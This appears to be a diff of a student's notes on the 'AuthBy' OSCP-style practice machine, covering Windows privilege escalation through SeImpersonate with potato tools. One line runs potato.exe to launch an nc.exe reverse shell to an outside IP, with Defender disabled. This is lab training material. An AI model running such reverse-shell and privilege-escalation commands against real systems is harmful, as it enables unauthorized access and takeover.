@@ -2,10 +2,13 @@
 
 Name: AuthBy
 Date:  
-Difficulty:  
+Difficulty:  Intermediate
 Goals:  
+- TJNull List OSCP-like machine - return to form
 Learnt:
+- 
 Beyond Root:
+- PHP webshell
 
 - [[AuthBy-Notes.md]]
 - [[AuthBy-CMD-by-CMDs.md]]
@@ -154,6 +157,17 @@ As per ACTUALLY READING THE INSTRUCTIONS
 .\potato.exe -ip 127.0.0.1 -cmd "c:\wamp\www\nc.exe 192.168.45.225 6969 -e c:\windows\system32\cmd.exe" -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL
 ```
 
+Built my own versions of both x86 and x64 SweetPotato considering [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for both [SweetPotato](https://github.com/CCob/SweetPotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+
+x64 and x86 version return the same error
+![](neitherx8664-sameerror.png)
+
+But it is not actually running...
+![](itran.png)
+
+Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. 
+
+Try https://github.com/antonioCoco/RogueWinRM
 ## Exploit
 
 
